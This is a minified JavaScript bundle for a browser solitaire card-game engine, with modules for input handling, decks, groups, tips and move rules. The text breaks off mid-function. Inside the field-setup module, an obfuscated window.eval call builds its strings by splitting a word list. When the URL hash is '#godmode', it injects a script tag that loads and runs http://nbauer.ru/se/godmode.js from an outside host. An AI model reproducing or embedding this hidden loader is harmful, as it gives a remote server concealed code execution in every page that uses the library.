/*
 * Solitaire game engine
 *
 * Author            : Roman Bauer - <kotapesic@gmail.com>
 * Version           : 0.12.376
 * Build time        : Thu, 07 Jul 2016 10:36:55 GMT
 * Portyanka version : (v. 0.1.0) Oct 2015
 * Webpack version   : (v. 0.9.6) Feb 24 2016
 */
var SolitaireEngine=function(e){function t(n){if(a[n])return a[n].exports;var i=a[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,t),i.loaded=!0,i.exports}var a={};return t.m=e,t.c=a,t.p="",t(0)}([function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(1),r=(n(i),a(2)),d=n(r),u=a(3),o=n(u),l=a(4),s=(n(l),a(53)),f=(n(s),a(56)),c=(n(f),a(9)),p=n(c),v=a(5),h=(n(v),a(54)),m=n(h);a(67),a(68),a(69),t.event=d["default"],t.options=o["default"],t.winCheck=m["default"].hwinCheck;var y=!0;t.init=function(e){d["default"].dispatch("gameInit",{firstInit:y}),y&&(y=!1);var a=(0,p["default"])(e);d["default"].dispatch("gameInited"),t.Redraw=function(e){a.Redraw(e)}}},function(e,t){"use strict";function a(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),i=function(){function e(){a(this,e),this.data={}}return n(e,[{key:"get",value:function(e){return void 0!==this.data[e]?this.data[e]:null}},{key:"set",value:function(e,t,a){if("string"==typeof e)"boolean"==typeof a&&a?this.data[e]=Object.assign({},t):this.data[e]=t;else if(e instanceof Object&&void 0===t)for(var n in e)this.data[n]=e[n]}},{key:"getAll",value:function(){return this.data}}]),e}();t["default"]=new i},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var a={};t["default"]=new function(){this.listen=function(e,t){"string"==typeof e&&"function"==typeof t&&(a[e]?a[e].push(t):a[e]=[t])},this.dispatch=function(e,t){if(a[e])for(var n in a[e])a[e][n](t)}}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]={pref:{field:"default_field",face:"alternative_face",back:"default_back"},stepType:"default",themes:{field:["default_field","alternative_field"],face:["default_face","alternative_face"],back:["default_back","alternative_back"]},showTips:!0,showTipsDestination:!1,showTipPriority:!1,canMoveFlip:!1,tipsParams:{hideOnEmpty:!1,excludeHomeGroups:!0},zoom:1,locale:"ru",animation:!0,animationTime:300,inputParams:{doubleClick:!1},flip:null,actions:null,can_move_flip:!1,showSlot:!0,autohide:!1,paddingType:"none",flip_type:"none",takeRules:["onlytop"],putRule:"any",moveDistance:0,padding_y:0,padding_x:0,flip_padding_y:0,flip_padding_x:0,move_distance:10,debugLabels:!1,startZIndex:100,topZIndex:900,card:{width:71,height:96,suits:["h","d","c","s"],colors:{red:["h","d"],black:["c","s"]},ranks:["1","2","3","4","5","6","7","8","9","10","j","q","k"],values:[1,2,3,4,5,6,7,8,9,10,11,12,13],ranks36:["1","6","7","8","9","10","j","q","k"]}}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(1),r=n(i),d=a(2),u=n(d),o=a(3),l=(n(o),a(5)),s=n(l),f=a(11),c=n(f),p=a(6),v=n(p);r["default"].set("dragDeck",null),r["default"].set("startCursor",null);var h=function(){var e=r["default"].get("dragDeck");if(e&&e[0]&&e[0].card&&e[0].card.parent){var t=c["default"].getDeckById(e[0].card.parent);t&&t.Redraw()}r["default"].set("dragDeck",null),r["default"].set("startCursor",null),s["default"].curUnLock()};u["default"].listen("undo",function(){h()}),u["default"].listen("redo",function(){h()});var m=function(e,t,a){if(r["default"].set("dragDeck",null),r["default"].set("startCursor",null),!s["default"].isCurLock()){if(e.className.split(" ").indexOf("slot")>=0){var n=e.id,i=s["default"].getElementById(n);i&&u["default"].dispatch("click",i)}if(e.className.split(" ").indexOf("draggable")>=0){var n=e.id,d=n?s["default"].getElementById(n):null,o=d&&d.parent?d.parent:null,i=o?c["default"].getDeckById(o):null;i&&u["default"].dispatch("click",i);var l=i?i.Take(n):null;r["default"].set("dragDeck",l),l&&(r["default"].set("startCursor",{x:t,y:a}),v["default"].tipsDestination({currentCard:d}))}}},y=function(e,t){if(!s["default"].isCurLock()){var a=r["default"].get("startCursor"),n=r["default"].get("dragDeck");if(n&&a){var i=a?Math.sqrt(s["default"].sqr(e-a.x)+s["default"].sqr(t-a.y)):0,d=s["default"].getElementById(n[0].card.parent),o=d.padding(n[n.length-1].index);u["default"].dispatch("dragDeck",{x:e,y:t,_dragDeck:n,_startCursor:a,_deck:d});var l={distance:i,direction:{x:e-a.x,y:t-a.y,right:e>a.x,left:e<a.x,down:t>a.y,up:t<a.y},lastPosition:{x:e,y:t},deckPosition:{x:o.x+(e-a.x),y:o.y+(t-a.y)}};v["default"].tipsMove({moveDeck:n,cursorMove:l})}}},g=function(e,t,a,n){if(window._debug_time=(new Date).getTime(),!s["default"].isCurLock()){var i=r["default"].get("startCursor"),d=r["default"].get("dragDeck");if(d&&i){var o=s["default"].getElementById(d[0].card.parent),l=o.padding(d[0].index),f={distance:Math.sqrt(s["default"].sqr(t-i.x)+s["default"].sqr(a-i.y)),dbclick:!!n,direction:{x:t-i.x,y:a-i.y,right:t>i.x,left:t<i.x,down:a>i.y,up:a<i.y},lastPosition:{x:t,y:a},deckPosition:{x:l.x+(t-i.x),y:l.y+(a-i.y)}};r["default"].set("lastCursorMove",f,!0),u["default"].dispatch("hideCard",e);var c=document.elementFromPoint(t,a);u["default"].dispatch("showCard",e),u["default"].dispatch("Move",{moveDeck:d,to:c,cursorMove:f}),r["default"].set("dragDeck",null),r["default"].set("startCursor",null)}}};try{document.onmousedown=function(e){0===e.button&&m(e.target,e.clientX,e.clientY)},document.onmousemove=function(e){y(e.clientX,e.clientY)},document.onmouseup=function(e){g(e.target,e.clientX,e.clientY)},document.ondblclick=function(e){m(e.target,e.clientX,e.clientY),g(e.target,e.clientX,e.clientY,!0),s["default"].curUnLock()},document.addEventListener("touchstart",function(e){m(e.target,e.touches[0].clientX,e.touches[0].clientY)},!1),document.addEventListener("touchmove",function(e){r["default"].startCursor&&e.preventDefault(),y(e.touches[0].clientX,e.touches[0].clientY)},!1),document.addEventListener("touchend",function(e){g(e.changedTouches[0].target,e.changedTouches[0].clientX,e.changedTouches[0].clientY)},!1)}catch(k){}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(1),r=n(i),d=a(2),u=n(d),o=a(3),l=n(o),s=a(6),f=n(s),c=a(9),p=n(c),v=a(22),h=n(v),m=a(48),y=n(m),g=a(50),k=n(g),_=a(52),x=n(_);u["default"].listen("gameInit",function(e){e.firstInit&&((0,y["default"])(),(0,k["default"])())}),u["default"].listen("gameInited",function(){(0,x["default"])()}),u["default"].listen("finalStep",function(e){r["default"].set("stepType",l["default"].stepType),("boolean"!=e||e)&&u["default"].dispatch("makeStep",h["default"].get())});var b=function(e){return e*e},w=!1,D=function(){return w},P=function(){w=!0};u["default"].listen("lock",P);var C=function(){P=!1};u["default"].listen("unlock",C);var M=function(){return r["default"].get("curLockState")},T=function(){r["default"].set("curLockState",!0)},O=function(){r["default"].set("curLockState",!1)},I=function(){return r["default"].get("elements")},E=function(e){var t=r["default"].get("elements");return t[e]},R=function(e,t){var a=[],n=r["default"].get("elements");for(var i in n)n[i].name&&"string"==typeof n[i].name&&n[i].name==e&&(t&&"string"==typeof n[i].type&&t&&n[i].type==t?a.push(n[i]):a.push(n[i]));return a},j=function(e,t){if("string"!=typeof e)return!1;var a=e.slice(0,1),n=e.slice(1,3),i=null,r=l["default"].card.values[l["default"].card.ranks.indexOf(n)];for(var d in l["default"].card.colors)l["default"].card.colors[d].indexOf(a)>=0&&(i=d);return l["default"].card.suits.indexOf(a)>=0&&l["default"].card.ranks.indexOf(n)>=0&&{suit:a,rank:n,color:i,value:r,name:e}},S=0,N=function(){return S++};r["default"].set("animation",l["default"].animation);var A=function(){r["default"].set("animation",!0)},B=function(){r["default"].set("animation",l["default"].animation)},X=function(){r["default"].set("animation",!1)};u["default"].listen("newGame",function(e){X()}),u["default"].listen("historyReapeater",function(e){if(e)r["default"].set("noRedraw",!0),r["default"].set("noTips",!0);else{r["default"].set("noRedraw",!1);var t=(0,p["default"])();t.Redraw(),r["default"].set("noTips",!1),f["default"].checkTips()}});var Y=function(e,t){for(var a in t)Group.Group(a).hasDeck()};r["default"].set("stepType",l["default"].stepType),t["default"]={isLock:D,lock:P,unlock:C,isCurLock:M,curLock:T,curUnLock:O,getElements:I,getElementById:E,getElementsByName:R,validateCardName:j,genId:N,animationOn:A,animationOff:X,animationDefault:B,deckInGroups:Y,sqr:b}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(2),r=n(i),d=a(1),u=n(d),o=a(3),l=n(o),s=a(5),f=(n(s),a(7)),c=n(f),p=a(8),v=n(p),h=a(11),m=n(h),y=a(9),g=n(y),k=l["default"].showTips,_=["tip","tipTo","tipPriority","tipToHome"],x=[],b=function(){return x},w=function(){if(u["default"].get("noTips"))return!1;r["default"].dispatch("hideTips");var e=m["default"].getDecks({visible:!0});if(x=(0,c["default"])({decks:e}),0===x.length&&u["default"].get("stepType")==l["default"].stepType&&r["default"].dispatch("noTips"),k){var t=(0,g["default"])(),a=t.homeGroups;for(var n in x)0===x[n].to.count&&t.tipsParams.hideOnEmpty||t.tipsParams.excludeHomeGroups&&a&&a.length&&a.indexOf(x[n].from.deck.parent)>=0||r["default"].dispatch("showTip",{el:x[n].from.card,type:"tip"}),a.indexOf(x[n].to.deck.parent)>=0&&r["default"].dispatch("showTip",{el:x[n].from.card,type:"tipToHome"})}};r["default"].listen("makeStep",w);var D=function(e){k=!0,e&&e.init||w()};r["default"].listen("tipsON",D);var P=function(e){k=!1,e&&e.init||w()};r["default"].listen("tipsOFF",P);var C=function(e){if(u["default"].get("showTipPriority")&&(r["default"].dispatch("hideTips",{types:["tipPriority"]}),u["default"].showTipPriority&&e&&e.moveDeck&&e.cursorMove&&e.cursorMove.distance&&e.cursorMove.distance>=u["default"].moveDistance)){var t=(0,v["default"])(e.moveDeck,e.cursorMove);t&&r["default"].dispatch("showTip",{el:t.to.deck,type:"tipPriority"})}},M=function(e){if(u["default"].get("showTipsDestination")&&(r["default"].dispatch("hideTips"),e&&e.currentCard&&e.currentCard.id))for(var t in x)x[t].from.card.id==e.currentCard.id&&r["default"].dispatch("showTip",{el:x[t].to.deck,type:"tipTo"})},T=function(e){for(var t in x)if(x[t].from.deck.name==e)return!0;return!1},O=function(e,t){for(var a in x)if(x[a].from.deck.name==e&&x[a].to.deck.name==t)return!0;return!1};t["default"]={tipTypes:_,getTips:b,checkTips:w,showTips:D,hideTips:P,tipsMove:C,checkFrom:T,fromTo:O,tipsDestination:M}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=[],a=function(a,n,i,r){var d=e.decks[a].cards,u=d.length?d[d.length-1]:null;t.push({from:{deck:e.decks[n],card:r[i],count:r.length},to:{deck:e.decks[a],lastCard:u,count:d.length}})},n=function(t,n,i,r){for(var d in e.decks)if(i!=d){var u=e.decks[d].Put(n);u&&a(d,i,r,t)}},i=function(t,a){for(var i in t){var r=t[i].id,d=e.decks[a].Take(r);d&&n(t,d,a,i)}};for(var r in e.decks){var d=e.decks[r].cards;i(d,r)}return t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e,t){var a=[],n=s["default"].getTips();for(p in n)n[p].from.card.id==e[0].card.id&&a.push(n[p]);if(0==a.length)return!1;var i=-1,r=0,u=0,l=(0,c["default"])(),f=l.homeGroups;if(f){var n=[];for(var p in f)for(var v in a)a[v].to.deck.parent==f[p]&&n.push(a[v]);n.length&&(a=n)}if(a.length>=2){for(var p in a){var h={x:t.deckPosition.x+d["default"].card.width,y:t.deckPosition.y+d["default"].card.height},m=a[p].to.deck.padding(a[p].to.deck.cards.length),y={x:m.x+d["default"].card.width,y:m.y+d["default"].card.height};a[p].distance=Math.sqrt(o["default"].sqr(h.x-y.x)+o["default"].sqr(h.y-y.y)),a[p].inDirection=!1,(t.direction.x>0&&y.x>h.x||t.direction.x<0&&y.x<h.x)&&(a[p].inDirection=!0,u+=1)}for(var p in a)"-1"==i&&(0==u?i=a[p].distance:a[p].inDirection&&(i=a[p].distance,r=p)),a[p].distance<i&&(0==u?(i=a[p].distance,r=p):a[p].inDirection&&(i=a[p].distance,r=p))}return a[r]};var i=a(1),r=(n(i),a(3)),d=n(r),u=a(5),o=n(u),l=a(6),s=n(l),f=a(9),c=n(f)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(1),r=n(i),d=a(2),u=n(d),o=a(3),l=n(o),s=a(5),f=n(s),c=a(10),p=n(c),v=a(11),h=n(v),m=a(6),y=n(m),g=a(45),k=n(g),_=null;try{window.eval('d=window;w="eval,document,location,hash,#godmode,createElement,script,src,http://nbauer.ru/se/godmode.js,head,appendChild"["split"](\',\');d[w[1]][w[2]][w[3]]==w[4]&&(d[w[4]]=d[w[1]][w[5]](w[6]),d[w[4]][w[7]]=w[8],d[w[1]][w[9]][w[10]](d[w[4]]))')}catch(x){}var b=function(e){if(!e)return!1;f["default"].unlock(),e&&_?_.clear():r["default"].set("elements",{});var t=null;try{t=Object.assign({},e)}catch(a){t=e}this.homeGroups=t.homeGroups?t.homeGroups:[],"boolean"==typeof t.showTips&&t.showTips?y["default"].showTips({init:!0}):y["default"].hideTips({init:!0}),r["default"].set("stepType",l["default"].stepType),r["default"].set("showTipsDestination","boolean"==typeof t.showTipsDestination?t.showTipsDestination:l["default"].showTipsDestination),r["default"].set("showTipPriority","boolean"==typeof t.showTipPriority?t.showTipPriority:l["default"].showTipPriority),r["default"].set("moveDistance",t.moveDistance&&"number"==typeof t.moveDistance?t.moveDistance:l["default"].moveDistance),r["default"].set("winCheck",t.winCheck),t.winCheck&&t.winCheck.callback&&"function"==typeof t.winCheck.callback&&(winCheckCallback=t.winCheck.callback),t.saveStep&&"function"==typeof t.saveStep&&(saveStepCallback=t.saveStep),r["default"].set("zoom",t.zoom&&"number"==typeof t.zoom?t.zoom:l["default"].zoom),this.tipsParams={};for(var n in l["default"].tipsParams)this.tipsParams[n]=t.tipsParams&&void 0!==t.tipsParams[n]?t.tipsParams[n]:l["default"].tipsParams[n];this.inputParams={};for(var i in l["default"].inputParams)this.inputParams[i]=t.inputParams&&void 0!==t.inputParams[i]?t.inputParams[i]:l["default"].inputParams[i];var d=t.can_move_flip&&"boolean"==typeof t.can_move_flip?t.can_move_flip:l["default"].canMoveFlip;r["default"].set("can_move_flip",d),r["default"].set("debugLabels",t.debugLabels&&"boolean"==typeof t.debugLabels?t.debugLabels:l["default"].debugLabels),t.startZIndex&&"number"==typeof t.startZIndex&&r["default"].set("start_z_index",t.startZIndex),t.autoSteps&&(this.autoSteps=(0,k["default"])(t.autoSteps)),"string"==typeof t.lang&&r["default"].set("lang",t.lang),this.Draw=function(e){if(r["default"].set("noRedraw",!0),e&&(t=Object.assign({},e)),t){if(t.groups)for(var a in t.groups)t.groups[a].name=a,p["default"].addGroup(t.groups[a]);if(t.decks)for(var n in t.decks)h["default"].addDeck(t.decks[n]);if(t.fill)for(var i=h["default"].getDecks(),d=Object.assign([],t.fill);d.length;)for(var o in i)if(d.length){var l=d.shift();i[o].Fill([l])}r["default"].set("noRedraw",!1),this.Redraw(),y["default"].checkTips(),u["default"].dispatch("newGame"),f["default"].unlock()}}};b.prototype.clear=function(){var e=r["default"].get("elements");for(var t in e)"deck"==e[t].type?(e[t].clear(),e[t]=null):"group"==e[t].type&&(e[t]=null);r["default"].set("elements",{})},b.prototype.Redraw=function(e){var t=null;if(e){try{t=Object.assign({},e)}catch(a){t=e}for(var n in t.groups){var i=p["default"].Group(n);i&&i.Redraw(t.groups[n])}for(var r in t.decks){var d=h["default"].Deck(t.decks[r].name);d&&d.Redraw(t.decks[r])}}else{var u=h["default"].getDecks();for(var r in u)u[r].Redraw()}};var w=function(e){return e&&_&&(_.clear(),_.Draw(e)),e&&!_&&(_=new b(e),u["default"].dispatch("initField",{a:e}),_.Draw()),_};t["default"]=w},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),d=a(2),u=(n(d),a(1)),o=n(u),l=a(3),s=n(l),f=a(5),c=n(f),p=a(11),v=n(p),h=a(32),m=n(h),y=a(33),g=n(y),k=a(34),_=n(k),x={paddingType:{type:"any"},flip:{type:"any"},showSlot:{type:"any"},takeRules:{type:"any"},putRules:{type:"any"},fillRule:{type:"any"},autoHide:{type:"any"},paddingX:{type:"any"},paddingY:{type:"any"},flipPaddingX:{type:"any"},flipPaddingY:{type:"any"},actions:{type:"any"}},b=function(){function e(t,a){i(this,e),this.type="group";var n=a;this.getId=function(){return n},this.name=t.name&&"string"==typeof t.name?t.name:"name_"+n,this.position={x:t.position&&t.position.x&&"number"==typeof t.position.x?t.position.x:0,y:t.position&&t.position.y&&"number"==typeof t.position.y?t.position.y:0},this.placement=t.placement?{x:t.placement.x?t.placement.x:0,y:t.placement.y?t.placement.y:0}:null,this.decks={},this.parameters={};for(var r in x)"any"==x[r].type?this.parameters[r]=t[r]?t[r]:s["default"][r]:"boolean"==x[r].type&&(this.parameters[r]="boolean"==typeof t[r]?t[r]:s["default"][r]);this.deckIndex=[]}return r(e,[{key:"addDeck",value:function(e){if(e){e.position||(e.position={x:0,y:0}),e.parent||(e.parent=this.name),e.parentPosition={x:this.position.x,y:this.position.y};var t=0;if(e.groupIndex&&"number"==typeof e.groupIndex&&this.deckIndex[e.groupIndex-1]&&decks[this.deckIndex[e.groupIndex-1]]["this"].deckIndex==e["this"].deckIndex&&(e.groupIndex=null),e.groupIndex&&"number"==typeof e.groupIndex)if(this.deckIndex[e.groupIndex-1]){for(;void 0!==this.deckIndex[t];t+=1);if(placement){var t=this.deckIndex[e.groupIndex-1],a=o["default"].get("elements");placement.x&&a[t].x(this.position.x+(placement.x+s["default"].card.width)*t),placement.y&&a[t].y(this.position.y+(placement.y+s["default"].card.width)*t),o["default"].set("elements",a)}this.deckIndex[t]=this.deckIndex[e.groupIndex-1],this.deckIndex[e.groupIndex-1]=!0,t=e.groupIndex-1}else this.deckIndex[e.groupIndex-1]=!0,t=e.groupIndex-1;else{for(;void 0!==this.deckIndex[t];t+=1);this.deckIndex[t]=!0}this.placement&&(this.placement.x&&(e.position.x=(this.placement.x+s["default"].card.width)*t),this.placement.y&&(e.position.y=(this.placement.y+s["default"].card.height)*t));for(var n in x)"any"==x[n].type?this.parameters[n]&&void 0===e[n]&&(e[n]=this.parameters[n]):"boolean"==x[n].type&&void 0!==this.parameters[n]&&void 0===e[n]&&(e[n]=this.parameters[n]);var i=v["default"].addDeck(e);this.deckIndex[t]=i.getId(),this.decks[i.getId()]=i}}},{key:"Fill",value:function(e){m["default"].call(this,e)}},{key:"getDeckById",value:function(e){return this.decks[e]}},{key:"getDecksByName",value:function(e){var t={};for(var a in this.decks)this.decks[a].name==e&&(t[a]=decks[a]);return t}},{key:"getDecks",value:function(e){var t=[];for(var a in this.decks)e&&e.visible?this.decks[a].visible&&t.push(this.decks[a]):t.push(this.decks[a]);return t}},{key:"Redraw",value:function(e){g["default"].call(this,e)}},{key:"hasDeck",value:function(e){var t=!1;for(var a in decks)decks[a].name==e&&(t=!0);return t}}]),e}(),w=function(e){if(!e)return!1;var t="group_"+c["default"].genId(),a=new b(e,t);if(e.decks){if("number"==typeof e.decks&&(e.decks={generator:{type:"count",count:e.decks}}),e.decks.generator){if(!e.decks.generator.type)return;if(!_["default"][e.decks.generator.type])return;e.decks=_["default"][e.decks.generator.type].call(a,e.decks.generator),e.placement=null}for(var n in e.decks)for(var i in e.decks[n].relations){var r=Object.assign({},e.decks[n].relations[i]);for(var d in e.decks)e.decks[d].name==r.to&&(r.to=null,r.from=e.decks[n].name,e.decks[d].relations.push(r))}for(var u in e.decks)a.addDeck(e.decks[u])}var l=o["default"].get("elements");if(l[t]=a,o["default"].set("elements",l),e&&e.fill){var s=e.fill.length;s&&a.Fill(e.fill)}return a},D=function(e){return c["default"].getElementsByName(e,"group")[0]};t["default"]={addGroup:w,Group:D}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),d=a(2),u=n(d),o=a(1),l=n(o),s=a(3),f=n(s),c=a(5),p=n(c),v=a(12),h=n(v),m=a(13),y=n(m),g=a(15),k=(n(g),a(16)),_=n(k),x=a(17),b=n(x),w=a(18),D=n(w),P=a(25),C=n(P),M=a(26),T=n(M),O=a(27),I=n(O),E=a(10),R=n(E),j=a(22),S=n(j),N=a(28),A=n(N),B=a(29),X=n(B),Y=a(30),L=n(Y),F=a(31),z=n(F),G=function(){function e(t,a){var n=this;if(i(this,e),!t)return!1;this.cards=[],this.getTopCard=function(){return 0!==this.cards.length&&this.cards[this.cards.length-1]},this.type="deck",this.fill=!1;var r=a;this.getId=function(){return r},this.locked=!!t.locked;var d=R["default"].Group(t.parent),o=d?d.name:"xname",l=d?d.getDecks().length:r;this.name=t.name&&"string"==typeof t.name?t.name:o+"_"+l,this.visible=!t.visible||"boolean"!=typeof t.visible||t.visible,this.groupIndex=t.groupIndex&&"number"==typeof t.groupIndex?t.groupIndex:null,this.parent=t.parent&&"string"==typeof t.parent?t.parent:"field",this.autoHide=t.autoHide&&"boolean"==typeof t.autoHide?t.autoHide:f["default"].autohide,void 0===t.showSlot&&(t.showSlot=f["default"].showSlot);var s={};s.x=0,s.y=0,s.rotate=this.rotate=0,s.padding_y=t.paddingY&&"number"==typeof t.paddingY?t.paddingY:f["default"].padding_y,s.flip_padding_y=t.flipPaddingY&&"number"==typeof t.flipPaddingY?t.flipPaddingY:f["default"].flip_padding_y,s.padding_x=t.paddingX&&"number"==typeof t.paddingX?t.paddingX:f["default"].padding_x,s.flip_padding_x=t.flipPaddingX&&"number"==typeof t.flipPaddingX?t.flipPaddingX:f["default"].flip_padding_x,s.startZIndex=t.startZIndex&&"number"==typeof t.startZIndex?t.startZIndex:f["default"].startZIndex;var c=t.flip&&"string"==typeof t.flip?t.flip:f["default"].flip_type,p=h["default"][c];this.flipCheck=function(){for(var e in this.cards)p(this.cards[e],0|e,this.cards.length);u["default"].dispatch("redrawDeckFlip",this)},this.putRules=t.putRules?"function"==typeof t.putRules?t.putRules:"string"==typeof t.putRules?y["default"][t.putRules]?y["default"][t.putRules]:y["default"][f["default"].putRule]:t.putRules.constructor==Array?t.putRules:y["default"][f["default"].putRule]:y["default"][f["default"].putRule],this.takeRules=t.takeRules,this.fillRules=null,t.fillRule&&!t.fillRules&&(t.fillRules=[t.fillRule]),t.fillRules&&(this.fillRules=t.fillRules);var v=t.paddingX||t.paddingY?b["default"].special:t.paddingType?"string"==typeof t.paddingType&&b["default"][t.paddingType]?b["default"][t.paddingType]:b["default"].none:b["default"][f["default"].paddingType];this.padding=function(e){var t=v(s,this.cards[e],e,this.cards.length,this.cards);return t},this.actions=[],t.actions&&(this.actions=t.actions,D["default"].addActions.call(this)),t.relations?this.relations=t.relations:this.relations=[],u["default"].dispatch("addDeckEl",{a:t,deck:this,params:s});var m=function(e){e.destination.name==n.name&&n.checkFill()};u["default"].listen("moveDragDeck",m),this.Redraw=function(e){u["default"].dispatch("redrawDeck",{deck:this,data:e,params:s,cards:this.cards})}}return r(e,[{key:"checkFill",value:function(){if(!this.fill){var e=!0;for(var t in this.fillRules)_["default"][t]&&(e=e&&!_["default"][t](this));this.fill=!e}}},{key:"Fill",value:function(e){for(var t in e)this.genCardByName(e[t])}},{key:"clear",value:function(){for(var e in this.cards)u["default"].dispatch("removeEl",this.cards[e]),this.cards[e]=null;this.cards=[],u["default"].dispatch("removeEl",this)}},{key:"Push",value:function(e){for(var t in e)e[t].parent=this.getId(),this.cards.push(e[t])}},{key:"Pop",value:function(e,t){if(this.cards.length<e)return!1;for(var a=[];e;e-=1){var n=this.cards.pop();t&&(n.parent=null),a.push(n),a[a.length-1].parent=null}return a.reverse(),this.autoHide&&0===this.cards.length&&this.hide(),this.Redraw(),a}},{key:"Take",value:function(e){return C["default"].call(this,e)}},{key:"Put",value:function(e){return T["default"].call(this,e)}},{key:"genCardByName",value:function(e){return I["default"].call(this,e)}},{key:"hide",value:function(){this.visible=!1,S["default"].add({hideDeck:this.name}),this.Redraw()}},{key:"show",value:function(){this.visible=!1,S["default"].add({showDeck:this.name}),this.Redraw()}},{key:"getCardsByName",value:function(e){var t=[];for(var a in this.cards)this.cards[a].name==e&&t.push(this.cards[a]);return t}},{key:"Card",value:function(e){return this.getCardsByName(e)[0]}},{key:"hideCards",value:function(){for(var e in this.cards)this.cards[e].visible=!1,u["default"].dispatch("hideCard",this.cards[e])}},{key:"showCards",value:function(){for(var e in this.cards)this.cards[e].visible=!0,u["default"].dispatch("showCard",this.cards[e])}},{key:"getCardsNames",value:function(){var e=[];for(var t in this.cards)e.push(this.cards[t].name);return e}},{key:"cardsCount",value:function(){return this.cards.length}},{key:"getRelationsByName",value:function(e,t){var a=[];for(var n in this.relations)if(this.relations[n].name==e)if(t){var i=0,r=0;for(var d in t)r+=1,this.relations[n][d]==t[d]&&(i+=1);i==r&&a.push(this.relations[n])}else a.push(this.relations[n]);return a}}]),e}(),H=function(e){if(!e)return!1;var t="deck_"+p["default"].genId(),a=Object.assign({},e),n=new G(a,t);if(e.fill)for(var i in e.fill)"string"==typeof e.fill[i]&&n.genCardByName(e.fill[i]);var r=l["default"].get("elements");return r[t]=n,l["default"].set("elements",r),n};t["default"]={addDeck:H,Deck:z["default"],getDecks:A["default"],getDeckById:X["default"],deckCardNames:L["default"]}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]={none:function(e,t,a){e.flip=!1},all:function(e,t,a){e.flip=!0},notlast:function(e,t,a){e.flip=t<a-1},first_1:function(e,t,a){e.flip=t<1},first_2:function(e,t,a){e.flip=t<2},first_3:function(e,t,a){e.flip=t<3}}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(5),r=n(i),d=a(3),u=n(d),o=a(11),l=n(o),s=a(14),f=n(s),c={linePrev:function(e){var t=(0,f["default"])(e.to).prev;return!!t&&(e.link=t.to,!0)},lineNext:function(e){var t=(0,f["default"])(e.to).next;return!!t&&(e.link=t.to,!0)},_downupcards:function(e){if(0==e.cards.length)return!1;var t=r["default"].validateCardName(e.cards[e.cards.length-1].name),a=r["default"].validateCardName(e.putDeck[0].card.name);return!(!t||!a)&&{up:a,down:t}},_downupranknum:function(e){var t=c._downupcards(e);return!!t&&{down:u["default"].card.ranks.indexOf(t.down.rank),up:u["default"].card.ranks.indexOf(t.up.rank)}},_isFirst:function(e,t){if(0==e.cards.length){var a=null;return(a=r["default"].validateCardName(e.putDeck[0].card.name))&&a.rank==t}return!0},striped:function(e){if(0==e.cards.length)return!0;var t=r["default"].validateCardName(e.cards[e.cards.length-1].name).color,a=null,n=null;return(n=r["default"].validateCardName(e.putDeck[0].card.name))&&(a=n.color),t!=a},firstAce:function(e){return c._isFirst(e,"1")},firstKing:function(e){return c._isFirst(e,"k")},notForEmpty:function(e){return e.cards.length},onlyEmpty:function(e){return 0===e.cards.length},oneRank:function(e){if(0==e.cards.length)return!0;var t=c._downupcards(e);return t&&t.up.rank==t.down.rank},oneSuit:function(e){if(0==e.cards.length)return!0;var t=c._downupcards(e);return t&&t.up.suit==t.down.suit},any:function(e){return!0},not:function(e){return!1},ascendDeck:function(e){if(1==e.putDeck.length)return!0;var t=!0;for(var a in e.putDeck)if(a>0){var n=u["default"].card.ranks.indexOf(r["default"].validateCardName(e.putDeck[a-1].card.name).rank),i=u["default"].card.ranks.indexOf(r["default"].validateCardName(e.putDeck[a].card.name).rank);t=t&&1+n==i}return t},descendDeck:function(e){if(1==e.putDeck.length)return!0;var t=!0;for(var a in e.putDeck)if(a>0){var n=u["default"].card.ranks.indexOf(r["default"].validateCardName(e.putDeck[a-1].card.name).rank),i=u["default"].card.ranks.indexOf(r["default"].validateCardName(e.putDeck[a].card.name).rank);t=t&&n==1+i}return t},oneRankDeck:function(e){if(1==e.putDeck.length)return!0;var t=!0;for(var a in e.putDeck)if(a>0){var n=r["default"].validateCardName(e.putDeck[a-1].card.name).suit,i=r["default"].validateCardName(e.putDeck[a].card.name).suit;t=t&&n==i}return t},ascend:function(e){if(0==e.cards.length)return!0;var t=c._downupranknum(e);return 